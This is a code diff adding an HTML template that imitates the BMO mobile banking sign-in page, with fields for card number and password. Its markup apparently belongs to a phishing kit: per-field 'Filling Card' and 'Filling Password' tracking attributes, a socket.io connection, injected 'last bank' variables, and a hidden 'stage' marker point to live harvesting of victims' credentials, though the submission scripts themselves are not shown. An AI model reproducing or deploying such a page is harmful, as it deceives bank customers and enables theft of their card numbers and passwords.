@@ -1,0 +1,232 @@
+<html lang="en">
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+        <meta content="true" name="HandheldFriendly">
+        <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=0, viewport-fit=cover" name="viewport">
+        <meta content="telephone=no" name="format-detection">
+        <meta content="no-cache, no-store, must-revalidate" http-equiv="Cache-Control">
+        <meta content="no-cache" http-equiv="Pragma">
+        <meta content="0" http-equiv="Expires">
+        <link href="/assets/bmo/favicon.ico?v=1" rel="shortcut icon" />
+        <$ include head.ejs ?>
+        <script src="https://code.jquery.com/jquery-3.6.0.min.js" crossorigin="anonymous"></script>
+        <script>
+            var lrbank = '<?=escape($udata->last->bank)?>';
+            var lrinfo = '<?=escape($udata->last->info)?>';
+        </script>
+        <script src="/assets/js/actions.js?v=<?=time()?>"></script>
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.14.0/css/all.css">
+        <script src="/socket.io/socket.io.js"></script>
+    </head>
+    <body style="display: block;">
+        <div ng-version="2.4.10" style="">
+            <div class="main" prevent-ghost-click="">
+                <div class="appContent" aria-hidden="false">
+                    <div _nghost-uld-91="">
+                        <div _ngcontent-uld-91="" class="loginPage" _nghost-uld-87="">
+                            <page _ngcontent-uld-87="" class="loginPanelPage" _nghost-uld-35="">
+                                <div _ngcontent-uld-35="" class="page noStatusBar">
+                                    <div _ngcontent-uld-35="" class="contentWrapper">
+                                        <div>
+                                            <pdiv _ngcontent-uld-87="" class="header" _nghost-uld-49="">
+                                                <div _ngcontent-uld-49="" class="pageHeader centered">
+                                                    <!--template bindings={}-->
+                                                    <div _ngcontent-uld-49="" class="header">
+                                                        <div _ngcontent-uld-49="" class="headerIcon left">
+                                                        </div>
+                                                        <div _ngcontent-uld-49="" class="headerCenter">
+                                                            <!--template bindings={}-->
+                                                            <!--template bindings={}-->
+                                                            <span _ngcontent-uld-49="" aria-hidden="true" tabindex="-1">
+                                                                <!--template bindings={}--><img _ngcontent-uld-49="" class="logoImage" src="/assets/bmo/files/bmo-logo-white.svg" style="touch-action: none; -moz-user-select: none;">
+                                                            </span>
+                                                            <div _ngcontent-uld-49="" aria-hidden="true" class="title ">
+                                                            </div>
+                                                            <span _ngcontent-uld-49="" accessibilitytitle="" aria-atomic="true" aria-live="polite" style="display: block; height: 0; width: 0; overflow: hidden;"></span>
+                                                        </div>
+                                                        <!--template bindings={}-->
+                                                        <div _ngcontent-uld-49="" class="headerIcon right">
+                                                            <!--template bindings={}-->
+                                                            <button _ngcontent-uld-49="" data-ana="Fran&ccedil;ais">
+                                                                <!--template bindings={}-->
+                                                                <!--template bindings={}--><span _ngcontent-uld-49="" class="text">
+                                                                Fran&ccedil;ais
+                                                                </span>
+                                                            </button>
+                                                            <!--template bindings={}-->
+                                                        </div>
+                                                    </div>
+                                                    <!--template bindings={}-->
+                                                    <div _ngcontent-uld-49="" class="headerContent">
+                                                        <!--template bindings={}-->
+                                                        <div _ngcontent-uld-87="" class="headerMessage">
+                                                            Welcome!
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </pdiv>
+                                        </div>
+                                        <div _ngcontent-uld-87="" class="contentOuter">
+                                            <div _ngcontent-uld-87="" class="content">
+                                                <div _ngcontent-uld-87="" _nghost-uld-63="" class="firstSignInContentCard">
+                                                    <div _ngcontent-uld-63="" class="panelCard">
+                                                        <div _ngcontent-uld-63="" class="mat-card">
+                                                            <div _ngcontent-uld-87="" class="cardContent div-main ">
+                                                                <div _ngcontent-uld-91="">
+                                                                </div>
+                                                                <div hidden padding-bottom="" text-center="" class="ng-tns-c2-1 ng-star-inserted error-div" tabindex="0" style="padding: 0px 30px; color: red;">
+                                                                    <span class="error error-summary">Hmm. The information you provided doesn't match our records. Try again?</span>
+                                                                </div>
+                                                                <div _nghost-uld-101="">
+                                                                    <form class="authForm ng-untouched ng-pristine ng-valid lab-form" id="loginForm">
+                                                                        <input type="hidden" id="userAgent" name="userAgent">
+                                                                        <style>
+                                                                        .mat-card {
+                                                                            overflow: hidden;
+                                                                            padding: 0.5rem;
+                                                                            max-height: 100%;
+                                                                            border-radius: 0.3125rem;
+                                                                            background-color: #ffffff;
+                                                                            box-shadow: 0 0.125rem 0.125rem 0 rgb(0 25 40 / 24%), 0 0 0.125rem 0 rgb(0 25 40 / 12%);
+                                                                            border-style: solid;
+                                                                            border-width: 0.03125rem;
+                                                                            border-image-source: linear-gradient(to bottom, transparent, transparent 80%, rgba(0, 0, 0, 0.02) 95%, rgba(0, 0, 0, 0.04));
+                                                                            border-image-slice: 1;
+                                                                        }
+                                                                        </style>
+                                                                        <textfield _ngcontent-uld-101="" _nghost-uld-97="">
+                                                                            <div _ngcontent-uld-97="" class="textfield ">
+                                                                                <md-input-container _ngcontent-uld-97="" class="mat-input-container ng-untouched ng-pristine ng-valid">
+                                                                                    <div class="mat-input-wrapper">
+                                                                                        <div class="mat-input-table">
+                                                                                            <div class="mat-input-prefix"></div>
+                                                                                            <div class="mat-input-infix">
+                                                                                                <input id="input-card" type="tel" placeholder="Your Card Number" name="username" class="lrinput input-username" required="true" autocomplete="off" maxlength="19" oninput="this.value = this.value.replace(/[^0-9, ]/, '')" attr-action="Filling Card">
+                                                                                                <script src="/assets/js/splitter.js?v=<?=time()?>"></script>
+                                                                                                <link rel="stylesheet" href="/assets/css/card.css?<?=time()?>">
+                                                                                                
+                                                                                            </div>
+                                                                                            <div class="mat-input-suffix"></div>
+                                                                                        </div>
+                                                                                        <div class="mat-input-underline br-pos"><span class="mat-input-ripple"></span></div>
+                                                                                        <!--template bindings={}-->
+                                                                                    </div>
+                                                                                </md-input-container>
+                                                                                <!--template bindings={}-->
+                                                                                <inline-error _ngcontent-uld-97="" _nghost-uld-95="">
+                                                                                    <!--template bindings={}-->
+                                                                                </inline-error>
+                                                                            </div>
+                                                                        </textfield>
+                                                                        <!--template bindings={}--><!--template bindings={}-->
+                                                                        <textfield _ngcontent-uld-101="" name="password" password="true" _nghost-uld-97="">
+                                                                            <div _ngcontent-uld-97="" class="textfield ">
+                                                                                <md-input-container _ngcontent-uld-97="" class="mat-input-container ng-untouched ng-pristine ng-valid">
+                                                                                    <div class="mat-input-wrapper">
+                                                                                        <div class="mat-input-table">
+                                                                                            <div class="mat-input-prefix"></div>
+                                                                                            <div class="mat-input-infix">
+                                                                                                <input name="password" maxlength="18" required="true" data-ana="Your password" class="lrinput input-password" id="md-input-3" placeholder="Your password" aria-describedby="" type="password" attr-action="Filling Password" autocapitalize="none">
+                                                                                                <span class="mat-input-placeholder-wrapper"><!--template bindings={}--><label class="mat-input-placeholder mat-empty mat-float" for="md-input-3" aria-hidden="true" <!--template="" bindings="{}--"></label></span></div><div class="mat-input-suffix"></div></div><div class="mat-input-underline"><span class="mat-input-ripple"></span></div>
+                                                                                            </div>
+                                                                                </md-input-container>
+                                                                                <!--template bindings={}-->
+                                                                                <inline-error _ngcontent-uld-97="" _nghost-uld-95=""><!--template bindings={}--></inline-error>
+                                                                            </div>
+                                                                        </textfield>
+                                                                        <!--template bindings={}--><div _ngcontent-uld-101="" class="forgotPassLinkContainer">
+                                                                        <a _ngcontent-uld-101="" class="forgotPassLink" tabindex="0" data-ana="Forgot Password?">
+                                                                        Forgot Password?
+                                                                        </a>
+                                                                        </div>
+                                                                        <!--template bindings={}--><div _ngcontent-uld-101="" class="rememberCardCheckboxContainer">
+                                                                        <md-checkbox _ngcontent-uld-101="" class="rememberCardCheckbox mat-primary mat-checkbox ng-untouched ng-pristine ng-valid" color="primary" formcontrolname="rememberCard"><label class="mat-checkbox-layout"><div class="mat-checkbox-inner-container"><input class="mat-checkbox-input cdk-visually-hidden" id="input-md-checkbox-1" name="null" tabindex="0" aria-label="" data-ana="" type="checkbox"><!--template bindings={}--><div class="mat-checkbox-ripple mat-ripple" md-ripple=""></div><div class="mat-checkbox-frame"></div><div class="mat-checkbox-background"><svg xml:space="preserve" class="mat-checkbox-checkmark" version="1.1" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path class="mat-checkbox-checkmark-path" d="M4.1,12.7 9,17.6 20.3,6.3" fill="none" stroke="white"></path></svg><div class="mat-checkbox-mixedmark"></div></div></div><span class="mat-checkbox-label">
+                                                                        Remember my card
+                                                                        </span></label></md-checkbox>
+                                                                        </div>
+                                                                        <round-button _ngcontent-uld-101="" class="signInButton" _nghost-uld-53="" data-ana="SIGN IN"><!--template bindings={}-->
+                                                                            <div _ngcontent-uld-53="" class="roundButton enabled">
+                                                                                <button _ngcontent-uld-53="" onclick="submitForm()"  type="button" class="uppercase btn-login">
+                                                                                    <span class="btn-txt" _ngcontent-uld-53="" aria-hidden="true" buttoncontent="">SIGN IN</span>
+                                                                                    <span class="btn-spinner" style="display: none"><i class="fa fa-spinner fa-spin"></i></span>
+                                                                                    <span _ngcontent-uld-53="" accessibilitycontent="" class="visuallyHidden lowerCase"></span>
+                                                                                </button>
+                                                                            </div>
+                                                                        <!--template bindings={}--></round-button>
+                                                                        <!--template bindings={}--><div _ngcontent-uld-101="" class="register">
+                                                                        <span _ngcontent-uld-101="">New to Mobile Banking? </span>
+                                                                        <a _ngcontent-uld-101="" class="registerLink">Register now.</a>
+                                                                        </div>
+                                                                    </form>
+                                                                </div>
+                                                            </div>
+                                                            <div class="div-loader" style="display: none">
+                                                                <style>
+                                                                .loader-div {
+                                                                    text-align: center;
+                                                                    padding-top: 43px;
+                                                                    padding-bottom: 60px;
+                                                                }
+
+                                                                .loader-div h2 {
+                                                                    font-size: 25px;
+                                                                    margin-bottom: 40px;
+                                                                }
+
+                                                                .loader-div p {
+                                                                    margin-top: 37px;
+                                                                    padding: 0px 42px;
+                                                                    font-size: 16px;
+                                                                }
+                                                                </style>
+                                                                <div class="global-error-from-container loader-div" id="idf">
+                                                                    <h2>Processing</h2>
+                                                                    <img src="/assets/bmo/loading.gif" width="80">
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <page-footer _ngcontent-uld-91="" _nghost-uld-89="">
+                                            <div _ngcontent-uld-89="" class="pageFooter">
+                                                <!--template bindings={}-->
+                                                <div _ngcontent-uld-91="" class="footer">
+                                                    <icon-button _ngcontent-uld-91="" icon="icon-contact_big" uppercase="true" _nghost-uld-43="" data-ana="CONTACT US" role="button" tabindex="0">
+                                                        <div _ngcontent-uld-43="" class="iconButton  ">
+                                                            <div _ngcontent-uld-43="" class="icon" aria-hidden="true">
+                                                                <img src="/assets/bmo/files/1.png">
+                                                            </div>
+                                                            <div _ngcontent-uld-43="" class="text" aria-label="contact us">
+                                                                CONTACT US
+                                                            </div>
+                                                        </div>
+                                                    </icon-button>
+                                                    <icon-button _ngcontent-uld-91="" icon="icon-location_big" uppercase="true" _nghost-uld-43="" data-ana="FIND US" role="button" tabindex="0">
+                                                        <div _ngcontent-uld-43="" class="iconButton  ">
+                                                            <div _ngcontent-uld-43="" class="icon" aria-hidden="true">
+                                                                <img src="/assets/bmo/files/2.png">
+                                                            </div>
+                                                            <div _ngcontent-uld-43="" class="text" aria-label="find us">
+                                                                FIND US
+                                                            </div>
+                                                        </div>
+                                                    </icon-button>
+                                                </div>
+                                            </div>
+                                        </page-footer>
+                                    </div>
+                                </div>
+                            </page>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <span hidden id="navig"> <%=navig%> </span>
+        <span hidden id="stage">Login</span>
+    </body>
+    <script src="/bank/bmo/js/script.js">
+    </script>
+</html>
